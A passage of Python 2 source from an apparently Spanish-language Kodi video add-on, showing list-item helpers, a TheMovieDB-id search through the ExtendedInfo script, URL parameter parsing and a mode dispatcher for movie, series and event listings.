	liz = xbmcgui.ListItem(name, iconImage = "DefaultVideo.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name, "Plot": description } )
	liz.setProperty('fanart_image', fanart)
	liz.setProperty('IsPlayable', 'true')

	if xbmc.getCondVisibility('System.HasAddon(script.extendedinfo)'):
		commands.append(("[B][COLOR yellow]ExtendedInfo[/COLOR][/B]","XBMC.RunScript(script.extendedinfo,info=extendedinfo,name=%s,id=%s)" % (name,id) ))

		liz.addContextMenuItems(commands, replaceItems=True)
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz)
	return ok
	
def add_video(name, url, mode, iconimage, fanart):

	try:
            name = name.encode('utf-8')
        except: pass
	
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + urllib.quote_plus(iconimage) + "&id=" + str(id)
	liz = xbmcgui.ListItem(name, iconImage = "DefaultVideo.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name } )
	liz.setProperty('fanart_image', fanart)
	liz.setProperty('IsPlayable', 'true') 
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz)
	return ok
	
def add_video2(name, url, mode, iconimage):

	try:
            name = name.encode('utf-8')
        except: pass
	
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + urllib.quote_plus(iconimage) + "&id=" + str(id)
	liz = xbmcgui.ListItem(name, iconImage = "DefaultVideo.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name } )
	liz.setProperty('fanart_image', fanart)
	liz.setProperty('IsPlayable', 'true') 
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz)
	return ok	
	
def addDir(name,url,mode,iconimage):
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&iconimage="+urllib.quote_plus(iconimage)
        ok=True
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
        return ok
	
def buscar_themovieid(): 

## ESTA FUNCION BUSCA EN LAS LISTAS m3u DENTRO DE LAS CATEGORIAS. | Cuantas mas categorias, mas lento ira el buscador a no ser que hagamos buscadores individuales.

	keyb = xbmc.Keyboard('', 'Escriba id de la pelicula: Themoviedb.org')
	keyb.doModal()
	if (keyb.isConfirmed()):
		
		searchText = urllib.quote_plus(keyb.getText()).replace('+', ' ')
			
		if xbmc.getCondVisibility('System.HasAddon(script.extendedinfo)'):
			   
			xbmc.executebuiltin( "RunScript(script.extendedinfo,info=extendedinfo, name=%s)" % searchText )

			if notificar == 'true':	
	
				xbmc.executebuiltin("XBMC.Notification(Extended Info,Abriendo: [COLOR green]" +name+ "[/COLOR] ,10000)")
		    
			  
		else:
				
			xbmcgui.Dialog().ok("El Script ExtendedInfo No esta instalado" , "[COLOR cyan]Necesario AddOn externo para ver informacion de peliculas[/COLOR]","[COLOR yellow]AddOns -> Instalar desde repositorio -> KODI add-on repository -> Add-ons de programas -> ExtendedInfo Script\n[COLOR lime]Despues de instalarlo configuralo para español.[/COLOR]")     


					
params = get_params()
url = None
name = None
mode = None
iconimage = None
id = None
trailer = None

xbmcplugin.setContent(int(sys.argv[1]), 'movies')

try:
	url = urllib.unquote_plus(params["url"])
except:
	pass
try:
	name = urllib.unquote_plus(params["name"])
except:
	pass
try:
	mode = int(params["mode"])
except:
	pass
try:
	iconimage = urllib.unquote_plus(params["iconimage"])
except:
	pass 
try:
	id = int(params["id"])
except:
	pass 
try:
	trailer = urllib.unquote_plus(params["trailer"])
except:
	pass 
	

print "Mode: " + str(mode)
print "URL: " + str(url)
print "Name: " + str(name)
print "iconimage: " + str(iconimage)
print "id: " + str(id)
print "trailer: " + str(trailer)

			

if mode == None or url == None or len(url) < 1:

	mensaje()
	menu()
	kill_residents()
		
elif mode == 1:
	selector(name, url, id, trailer)
elif mode == 2:
    Lista_novedades()
elif mode == 3:
	Lista_estrenos()
elif mode == 4:
    PLAYVIDEO(name,url)
elif mode == 5:
    Accion()
elif mode == 6:
	lista_animacion()
elif mode == 7:
	Lista_novedades()
elif mode == 13:
    Lista_Familiar()
elif mode == 24:
    Lista_Superheroes()
elif mode == 25:
	lista_sagas()
elif mode == 26:
	Lista_Peliculas()
elif mode == 28:
	PLAYSERIE(name,url)
elif mode == 29:
	Artes_Marciales()
elif mode == 30: 
	Lista_clasico()
elif mode == 31:
	Lista_Gpelis()
elif mode == 98:
    busqueda_global()
elif mode == 97:
    PAIR()
elif mode == 99:
    get_info_movie()
elif mode == 100:
    menu_player(name,url)
elif mode == 111:
    search()
elif mode == 115:
    play_video(url) 
elif mode == 116:
    peliculas()	
elif mode == 117:
	series()
elif mode == 119:
    Real_stream_settings()
elif mode == 120:
	urlresolver_settings()  
elif mode == 121:
    favoritos() 
elif mode == 125:
    video_tutoriales()
elif mode == 112:
	list_proxy()
elif mode == 127:
    buscar_themovieid()
elif mode == 128:
	TESTLINKS()
elif mode == 130:
	PLAYVIDEO7(name,url)
elif mode == 140:
	resolveurl_settings()
elif mode == 141:
	Lista_p4k()
elif mode == 142:
	Lista_Series()
elif mode == 143:
	m3u_playseries(name,url)
elif mode == 144:
	PLAYSERIE(name,url)
elif mode == 145:
    searchs()
elif mode == 146:
	search_p()
elif mode == 147:
	m3u_pelicula(name,url)
elif mode == 148:
	m3u_eventos(name,url)
elif mode == 149:
	eventos_deportivos()
elif mode == 150:
	emitiendo()
elif mode == 151:
	top15()
elif mode == 152:
	seriesretro()
elif mode == 155:
	novedades_series()
elif mode == 156:
	series_infantiles()
elif mode == 160:
	favoritos()

xbmcplugin.endOfDirectory(plugin_handle)